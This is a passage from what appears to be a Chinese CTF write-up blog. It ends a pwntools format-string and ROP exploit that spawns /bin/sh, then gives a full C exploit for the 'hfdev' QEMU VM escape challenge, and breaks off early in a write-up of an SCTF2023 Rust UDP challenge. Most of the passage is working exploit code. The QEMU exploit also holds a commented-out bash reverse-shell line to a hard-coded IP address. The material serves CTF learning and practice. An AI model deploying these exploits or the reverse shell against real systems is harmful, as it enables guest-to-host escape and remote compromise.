class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;%39$p%40$p%41$p%79$p&#x27;</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;%22$hhn&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + <span class="hljs-string">b&#x27;\x78&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;you.&#x27;</span>, payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elf.address = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x1543</span><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>] - <span class="hljs-number">243</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(elf.address))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>payload = fmtstr_payload(<span class="hljs-number">6</span>, &#123;(stack - <span class="hljs-number">0x128</span>) : (elf.address + <span class="hljs-number">0x146a</span>)&#125;,  write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;you.&#x27;</span>, payload)<br><br>pop_rdi_ret = libc.address + <span class="hljs-number">0x23b72</span><br>pop_rsi_ret = libc.address + <span class="hljs-number">0x2604f</span><br>pop_rdx__r12_ret = libc.address + <span class="hljs-number">0x119241</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x108</span> + p64(canary) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>payload += flat(<br>    pop_rdi_ret, <span class="hljs-number">0</span>,<br>    pop_rsi_ret, stack,<br>    pop_rdx__r12_ret, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>,<br>    libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    pop_rdi_ret, stack,<br>    pop_rdi_ret + <span class="hljs-number">1</span>,<br>    libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>)<br><br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>​                                    </p><h3 id="hfdev"><a href="#hfdev" class="headerlink" title="hfdev"></a>hfdev</h3><p>这道qemu逃逸果然不会，具体细节就看本文开头推荐的文章，这里就说一下自己遇到的坑：</p><ol><li>刚开始用inl和outl读写数据，但完全没反应，这题要用inw和outw读写。</li><li>执行hfdev_process函数后一定要sleep，感觉应该是多线程的原因，exp的主函数是与hfdev_process函数同时运行的，如果不sleep会造成条件竞争，后面设置的数据会影响上一次的hfdev_process函数的执行。</li></ol><p>​                                                               </p><p>这里是本地ubuntu20复现的exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> port_base = <span class="hljs-number">0xc040</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-comment">//printf(&quot;pfn_item_offset : %p\n&quot;, (uintptr_t)addr &gt;&gt; 9);</span><br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    close(fd);<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">pmio_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> port)</span>&#123;<br>    <span class="hljs-keyword">return</span> inw(port_base + port); <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pmio_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> port, <span class="hljs-type">uint64_t</span> value)</span>&#123;<br>    outw(value, port_base + port); <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> addr)</span>&#123;<br>    pmio_write(<span class="hljs-number">2</span>, addr);<br>    pmio_write(<span class="hljs-number">4</span>, addr &gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_size</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>&#123;<br>    pmio_write(<span class="hljs-number">6</span>, size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_time</span><span class="hljs-params">(<span class="hljs-type">size_t</span> value)</span>&#123;<br>    pmio_write(<span class="hljs-number">10</span>, value);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exec_bh</span><span class="hljs-params">()</span>&#123;<br>    pmio_write(<span class="hljs-number">12</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> p_addr, <span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x20</span>;<br>    *((<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">1</span>)) = p_addr;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">9</span>)) = size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_exec_time</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> size, <span class="hljs-type">uint16_t</span> offset)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x30</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">1</span>)) = size;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">3</span>)) = offset;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_encode1</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> add_byte, <span class="hljs-type">uint8_t</span> xor_byte, <span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x10</span>;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">1</span>)) = add_byte;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">2</span>)) = xor_byte;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">3</span>)) = <span class="hljs-number">0x2202</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">5</span>)) = size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_encode2</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x10</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">3</span>)) = <span class="hljs-number">0x2022</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">5</span>)) = size;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">size_t</span> pem_buf;<br>    <span class="hljs-type">size_t</span> heap_addr;<br>    <span class="hljs-type">size_t</span> elf_base;<br>    iopl(<span class="hljs-number">3</span>);<br><br>    <span class="hljs-comment">// leak heap_addr</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;STEP-1. leak heap_addr&quot;</span>);<br>    pem_buf = gva_to_gpa(buf);<br>    write_addr(pem_buf);<br>    write_size(<span class="hljs-number">0x400</span>);<br>    set_encode1(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x200</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0x100</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_encode2(<span class="hljs-number">0x300</span>);   <br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x300</span>)) = <span class="hljs-number">1</span>;<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br><br>    set_exec_time(<span class="hljs-number">0x10</span>, <span class="hljs-number">0x10</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_read(pem_buf, <span class="hljs-number">0x310</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    heap_addr = *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x308</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_heap_addr_is %#lx\n&quot;</span>, heap_addr);<br>    <span class="hljs-type">size_t</span> hfdev_addr = heap_addr - <span class="hljs-number">2696</span>;<br>    <span class="hljs-type">size_t</span> time_struct = hfdev_addr + <span class="hljs-number">0x1d40</span>;<br>    <span class="hljs-type">size_t</span> bh_struct = hfdev_addr - <span class="hljs-number">0x101a80</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;time_struct_addr_is %#lx\n&quot;</span>, time_struct);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bh_struct_addr_is %#lx\n&quot;</span>, bh_struct);<br>    <br><br>    <span class="hljs-comment">//leak elf_base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;STEP-2. leak qemu elf_addr&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>);<br>    set_encode2(<span class="hljs-number">0x300</span>);<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x300</span>)) = <span class="hljs-number">1</span>;<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0x10</span>, <span class="hljs-number">0x10</span>);<br>    *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x10</span>)) = time_struct;<br>    *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x18</span>)) = bh_struct;<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_encode2(<span class="hljs-number">0x300</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br><br>    write_time(<span class="hljs-number">8</span>);<br>    set_exec_time(<span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_encode2(<span class="hljs-number">0x310</span>);<br>    *((<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x308</span>)) = heap_addr ^ time_struct;<br>    exec_bh();<br>    sleep(<span class="hljs-number">1</span>);<br>    set_read(pem_buf, <span class="hljs-number">0x338</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    <span class="hljs-type">size_t</span> leak_addr = *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x330</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_addr_is %#lx\n&quot;</span>, leak_addr);<br>    elf_base = leak_addr - <span class="hljs-number">0x381190</span>;<br>    <span class="hljs-type">size_t</span> system_plt = elf_base + <span class="hljs-number">0x2D6610</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;qemu_elf_base_is %#lx\n&quot;</span>, elf_base);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;STEP-3. hijack time_struct&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>);<br>    <span class="hljs-type">size_t</span> faker_time_struct_addr = heap_addr + <span class="hljs-number">0x108</span>;<br>    <span class="hljs-type">size_t</span> cmd_addr = faker_time_struct_addr + <span class="hljs-number">0x40</span>;<br>    <span class="hljs-type">size_t</span> faker_time_struct[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">char</span> cmd[<span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br>    <span class="hljs-comment">//char cmd[0x40] = &quot;/bin/bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/192.168.184.142/8888 0&gt;&amp;1\&#x27;&quot;;</span><br>    faker_time_struct[<span class="hljs-number">0</span>] = <span class="hljs-number">0xffffffffffffffff</span>;<br>    faker_time_struct[<span class="hljs-number">1</span>] = time_struct - <span class="hljs-number">0x110f360</span>;<br>    faker_time_struct[<span class="hljs-number">2</span>] = system_plt;<br>    faker_time_struct[<span class="hljs-number">3</span>] = cmd_addr;<br>    faker_time_struct[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>    faker_time_struct[<span class="hljs-number">5</span>] = <span class="hljs-number">0x100000000</span>;<br><br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x108</span>, faker_time_struct, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x108</span> + <span class="hljs-number">0x40</span>, cmd, <span class="hljs-number">0x40</span>);<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x300</span>)) = <span class="hljs-number">1</span>;<br>    *((<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x310</span>)) = faker_time_struct_addr ^ time_struct;<br>    set_encode2(<span class="hljs-number">0x318</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br><br>    <span class="hljs-comment">//0x1d40  0x101a80</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sctf2023 Brave Knights and Rusty Swords</title>
    <link href="/2023/06/27/sctf2023/"/>
    <url>/2023/06/27/sctf2023/</url>
    
    <content type="html"><![CDATA[<p>上次在aliyun的比赛上也遇到过rust语言的题，但是那道rust的题是一道传统的堆菜单题，题目的输入输出完全都不用看ida就知道，而且后门函数也直接给出了，很容易就可以写出来。这次sctf给的是一个upd服务程序，输入输出也没有给你很多信息，这下就只能去拿ida去硬逆了（😭）。</p><p>由于是udp服务，nc连接时使用<code>nc -u 192.168.184.133 8080</code>。</p><h4 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h4><p>首先看到ida中的main函数很简单，肯定不是逻辑的主体，使用gdb attach程序的进程后发现有server_game::main函数，这个就是真正的逻辑主体函数：</p><img src="/img/14/Screenshot 2023-06-27 212845.png" style="zoom:50%;" /><p>点进去发现流程极其复杂，而且很多代码块都是<code>jmp  short $+2</code>相连接的，不知道为什么rust这样编译（感觉没有这个jmp，程序也能往后直接执行相应的代码块）</p><img src="/img/14/Screenshot 2023-06-27 214212.png"><p>伪代码就更不用说了，也不是特别好看，有很多奇奇怪怪的函数，不过这里重点关注<code>UdpSocket::recv_from</code>，因为用户就是通过这个函数来传递数据给程序的，而该udp服务是不断接收命令循环的，所以可以初步定位到如下伪代码：</p><img src="/img/14/Screenshot 2023-06-28 120409.png"><p>​                               </p><h4 id="part2"><a href="#part2" class="headerlink" 